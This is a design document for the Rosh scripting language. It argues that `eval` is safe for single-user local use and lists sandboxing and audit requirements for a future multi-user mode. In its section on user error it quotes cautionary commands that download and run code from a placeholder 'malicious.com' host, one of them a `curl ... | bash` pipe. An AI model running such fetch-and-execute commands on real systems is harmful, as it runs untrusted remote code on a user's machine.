# Eval Safety in Rosh

**Last Updated:** 2024-12-12
**Applies to:** v0.0.5 (Single-User Era)

## TL;DR

**For single-user, local development: `eval` is safe.**

`eval` executes Rosh code from a string. In single-user mode, this is no more dangerous than typing code into the REPL or running a .rosh file. The user controls what gets evaluated.

**For multi-user (future): `eval` will require sandboxing.** See [Multi-User Security Requirements](#multi-user-security-requirements) below.

---

## What is `eval`?

The `eval` command executes arbitrary Rosh code from a string:

```rosh
create string code as "print 'Hello from eval!'"
eval code
# Output: Hello from eval!
```

This is equivalent to dynamically executing code, similar to:
- Python's `eval()` and `exec()`
- JavaScript's `eval()`
- Shell's `eval`

---

## Why `eval` is Safe for Single-User

### 1. User Controls the Execution Environment

In single-user Rosh:
- **The user runs code on their own machine**
- **The user has full filesystem and system access anyway**
- **`eval` doesn't grant any new privileges**

Running `eval malicious_code` is no different than typing `malicious_code` into the REPL or putting it in a .rosh file.

### 2. No Privilege Escalation

`eval` executes code with the **same permissions as the Rosh interpreter**, which runs with the **user's own permissions**.

```rosh
# These are equivalent in terms of security:
create string dangerous as "write 'oops' to '/important/file'"
eval dangerous  # ← Executes with user's permissions

# vs.

write "oops" to "/important/file"  # ← Also executes with user's permissions
```

If the user can't write to `/important/file` normally, `eval` can't either.

### 3. User Intent is Clear

When a user writes:
```rosh
eval some_code
```

They are **explicitly choosing** to execute whatever is in `some_code`. This is intentional behavior, not a security vulnerability.

### 4. AI Safety Already Handled

AI-generated code that gets executed goes through `prompt exec`, which **requires user confirmation** (implemented in v0.0.4):

```rosh
prompt exec "create a file"
# Output:
# 🤖 AI generated code:
# ────────────────────────────────────────
# write "data" to "output.txt"
# ────────────────────────────────────────
#
# Execute this AI-generated code? [y/N]: _
```

The user sees the code and approves it **before** execution. If the AI-generated code contains `eval`, the user sees it and can cancel.

---

## Common Misconceptions

### ❌ "eval is dangerous because it executes arbitrary code"

**Reality:** In single-user mode, **all code is arbitrary code chosen by the user**.

Running a .rosh file, typing into the REPL, or using `eval` are all equivalent in terms of security. The user controls what runs.

### ❌ "AI could generate malicious eval statements"

**Reality:** AI code goes through `prompt exec` confirmation.

The user reviews AI-generated code before it runs. If the code contains `eval`, the user sees it in the confirmation prompt.

### ❌ "eval could be injected into user input"

**Reality:** There is no network input or multi-user environment.

In single-user mode, all "input" comes from:
- Code the user writes
- Files the user creates or downloads
- AI responses the user approves

If the user runs code that evaluates untrusted input, that's a **user error**, not a language vulnerability.

---

## When `eval` Could Be Problematic (User Error)

While `eval` itself is safe in single-user mode, users could misuse it:

### Example: Evaluating File Contents Without Review

```rosh
# User downloads untrusted code
read "https://malicious.com/code.rosh" into untrusted_code

# User evaluates it without reviewing
eval untrusted_code  # ⚠️ User chose to run untrusted code
```

**This is user error**, similar to:
- Running `curl https://malicious.com/script.sh | bash`
- Downloading and running an .exe file from an untrusted source

**Mitigation:** User education. The language doesn't prevent users from making bad decisions, but we can document best practices.

---

## Best Practices for Users

### ✅ DO:
- Use `eval` for dynamic code generation in your own projects
- Review code before evaluating it
- Use `prompt exec` with confirmation for AI-generated code

### ⚠️ DON'T:
- Evaluate code from untrusted sources without reviewing it
- Assume `eval` has special restrictions (it doesn't, by design)

### 💡 REMEMBER:
`eval code_string` is **exactly the same** as copying `code_string` into the REPL and pressing Enter.

---

## Multi-User Security Requirements

**When Rosh adds multi-user support (v0.1.0+), `eval` WILL become a security concern.**

### Why Multi-User Changes Everything

In a multi-user environment:
- **User A should not be able to eval code that affects User B**
- **User code must be sandboxed**
- **Malicious users could inject eval statements into shared spaces**

### Required Changes for Multi-User

Before multi-user launch, we MUST implement:

1. **Sandboxing for all code execution** ✅ REQUIRED
   - `eval` runs in isolated user space
   - Cannot access other users' data
   - Cannot access server filesystem
   - Resource limits (CPU, memory, time)

2. **Permission system** ✅ REQUIRED
   - `eval` requires explicit permission
   - Default: disabled in shared spaces
   - Admin can enable per-user or per-space

3. **Audit logging** ✅ REQUIRED
   - All `eval` calls logged with user ID
   - Code executed is recorded
   - Enables investigation of abuse

4. **Rate limiting** ✅ REQUIRED
   - Limit number of `eval` calls per user
   - Prevent abuse and DoS attacks

5. **Content inspection** 🟡 OPTIONAL
   - Scan eval'd code for known malicious patterns
   - Alert admins to suspicious activity

### Timeline

**Multi-user security (Milestone 9)** must be **100% complete** before any multi-user features ship.

See PROJECT-PLAN.md → Milestone 9 for full security roadmap.

---

## Comparison with Other Languages

| Language | `eval` Behavior | Single-User Safety |
|----------|-----------------|-------------------|
| **Rosh** | Executes Rosh code | ✅ Safe (user controls environment) |
| **Python** | Executes Python code | ✅ Safe (user controls environment) |
| **JavaScript** | Executes JS code | ✅ Safe in Node.js (⚠️ risky in browsers) |
| **Shell** | Executes shell commands | ✅ Safe (user controls environment) |
| **PHP** | Executes PHP code | ⚠️ Risky (often runs server-side) |

All of these languages have `eval` or equivalent. In **single-user, local execution**, `eval` is safe because the user controls what gets evaluated.

---

## Design Philosophy

Rosh's `eval` follows the **principle of least surprise**:

1. **Transparent execution**: `eval code` does exactly what you'd expect - it runs `code`
2. **No hidden restrictions**: `eval` doesn't artificially limit what you can do
3. **User autonomy**: The user is trusted to make decisions about their own code
4. **Future-proof**: We document multi-user requirements without prematurely restricting single-user use

### Why We Don't Restrict `eval` Now

We could add confirmation prompts or sandboxing to `eval` in single-user mode, but:

❌ **It would be security theater** - The user can just type the code directly instead
❌ **It would be annoying** - Interrupting the user for permission they already have
❌ **It would be inconsistent** - Running a file doesn't ask permission, why should `eval`?
✅ **Instead, we document clearly** - Users understand what `eval` does and when to use it

---

## Technical Implementation

Current implementation (v0.0.5):

```python
def eval_eval(self, node: Eval) -> None:
    """Execute: eval <code_string> - Execute Rosh code from a string"""
    code_value = self.eval_expression(node.code_expr)
    code = rosh_to_python(code_value)

    if not isinstance(code, str):
        raise RoshTypeError(f"eval requires a string, got {type(code).__name__}")

    # Execute the code
    self._execute_code_string(code)
```

**No confirmation, no sandboxing** - by design, for single-user use.

---

## Summary

**Current Status (v0.0.5 - Single-User):**
- ✅ `eval` is safe for single-user, local development
- ✅ No special restrictions needed
- ✅ AI code generation already has confirmation via `prompt exec`
- ✅ User controls their own execution environment

**Future Status (v0.1.0+ - Multi-User):**
- ⚠️ `eval` becomes a security concern in multi-user
- ✅ Sandboxing REQUIRED before multi-user launch
- ✅ Permission system REQUIRED
- ✅ Audit logging REQUIRED

**Bottom Line:**
`eval` is a powerful feature that trusts users to make decisions about their own code. In single-user mode, this is appropriate and safe. In multi-user mode, it will require strict sandboxing and access controls.

---

**Questions or concerns?** See:
- `docs/ARCHITECTURE.md` - System overview
- `ROSH-MANUAL.rosh` - Working examples
- Security roadmap is tracked internally until public release

---

*Last updated: 2024-12-12*
